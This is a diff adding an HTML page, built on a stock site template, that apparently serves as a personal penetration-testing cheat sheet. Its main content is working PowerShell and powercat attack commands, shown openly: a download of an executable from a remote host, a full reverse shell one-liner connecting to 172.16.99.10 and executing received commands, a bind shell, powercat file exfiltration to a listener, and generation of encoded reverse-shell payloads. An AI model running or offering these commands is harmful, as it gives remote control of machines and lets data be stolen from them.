@@ -1,0 +1,159 @@
+<!DOCTYPE HTML>
+<!--
+	Phantom by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Generic - Phantom by HTML5 UP</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<div class="inner">
+
+							<!-- Logo -->
+								<a href="index.html" class="logo">
+									<span class="symbol"><img src="images/logo.svg" alt="" /></span><span class="title">Home</span>
+								</a>
+
+							<!-- Nav -->
+								<nav>
+									<ul>
+										<li><a href="#menu">Menu</a></li>
+									</ul>
+								</nav>
+
+						</div>
+					</header>
+
+				<!-- Menu -->
+					<nav id="menu">
+						<h2>Menu</h2>
+						<ul>
+							<li><a href="index.html">Home</a></li>
+							<li><a href="generic.html">Ipsum veroeros</a></li>
+							<li><a href="generic.html">Tempus etiam</a></li>
+							<li><a href="generic.html">Consequat dolor</a></li>
+							<li><a href="elements.html">Elements</a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+						<div class="inner">
+							<h1>POWERSHELL</h1>
+
+							<i>Download file from web server</i><br>
+	<code>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.99.10/wget.exe','C:\Users\analyst\Desktop\wget.exe')"</code><br><br>
+	<code>-c</code> : execute the supplied command wrapped in double quotes as if it were typed on cmd line<br>
+	<code>new-object</code> : instantiates a .NET framework or COM object. In this example the WebClient class defined in the System.Net namespace. The WebClient class contains a public method called "DownloadFile" which requires a source location and a destination.<br><br>
+
+<i>PowerShell Reverse Shell One liner</i>
+<pre><code>
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.99.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data  = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();"
+</pre></code>
+<code>iex</code> : stands for INVOKE EXPRESSION<br><br>
+
+<i>PowerShell Bind Shells</i><br>
+<pre><code>powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"</pre></code>
+
+<br><br>
+<h1>POWERCAT</h1>
+Once powercat is transferred over to a target it needs to be dot sourced.
+
+<code>. .\powercat</code><br>
+This makes all functions and variables that powershell scripts need available.
+<br><br>
+
+<i>Powercat File Transfers</i><br>
+setup listener on Kali:	<code>nc -lnvp 443 > pc_rcvd.txt</code><br>
+invoke powercat: <code>powercat -c 172.16.99.10 -p 443 -i C:\Users\analyst\Desktop\README.md</code>
+<br><br>
+
+<i>Powercat Reverse Shell</i><br>
+<code>powercat -c IP -p 443 -e cmd.exe -v</code><br><br>
+
+<i>Powercat Bind Shell</i><br>
+<code>powercat -l -p 8443 -e cmd.exe</code><br><br>
+
+<i>Powercat Payloads</i><br>
+<code>powercat -c IP -p 443 -e cmd.exe -g > revShell.ps1</code><br>
+This will generate a file with powershell instructions that can then be executed separately from a PS prompt<br>
+<code>./revShell.ps1</code><br><br>
+
+By adding the <code>-g</code> option powercat will generate a payload. To add encoding add <code>-ge</code> as shown below:<br>
+<code>powercat -c IP -p 53 -e cmd.exe -ge > encRevShell.ps1</code><br><br>
+
+<b>type encRevShell.ps1</b><br>
+<code>ZgB1AG4AYwB0A...4AZQB4AGUAJwApAAoACgA=</code><br><br>
+
+The encoded file cannot be executed the same way as the unencoded method. Instead the entire contents of the encoded file must be copied and passed on the command line with the <code>-E</code> option.<br>
+<code>powershell -E ZgB1AG4AYwB0A...4AZQB4AGUAJwApAAoACgA=</code><br><br>
+
+
+
+					
+						</div>
+					</div>
+
+				<!-- Footer -->
+					<footer id="footer">
+						<div class="inner">
+							<section>
+								<h2>Get in touch</h2>
+								<form method="post" action="#">
+									<div class="fields">
+										<div class="field half">
+											<input type="text" name="name" id="name" placeholder="Name" />
+										</div>
+										<div class="field half">
+											<input type="email" name="email" id="email" placeholder="Email" />
+										</div>
+										<div class="field">
+											<textarea name="message" id="message" placeholder="Message"></textarea>
+										</div>
+									</div>
+									<ul class="actions">
+										<li><input type="submit" value="Send" class="primary" /></li>
+									</ul>
+								</form>
+							</section>
+							<section>
+								<h2>Follow</h2>
+								<ul class="icons">
+									<li><a href="#" class="icon brands style2 fa-twitter"><span class="label">Twitter</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-facebook-f"><span class="label">Facebook</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-instagram"><span class="label">Instagram</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-dribbble"><span class="label">Dribbble</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-github"><span class="label">GitHub</span></a></li>
+									<li><a href="#" class="icon brands style2 fa-500px"><span class="label">500px</span></a></li>
+									<li><a href="#" class="icon solid style2 fa-phone"><span class="label">Phone</span></a></li>
+									<li><a href="#" class="icon solid style2 fa-envelope"><span class="label">Email</span></a></li>
+								</ul>
+							</section>
+							<ul class="copyright">
+								<li>&copy; Untitled. All rights reserved</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+							</ul>
+						</div>
+					</footer>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
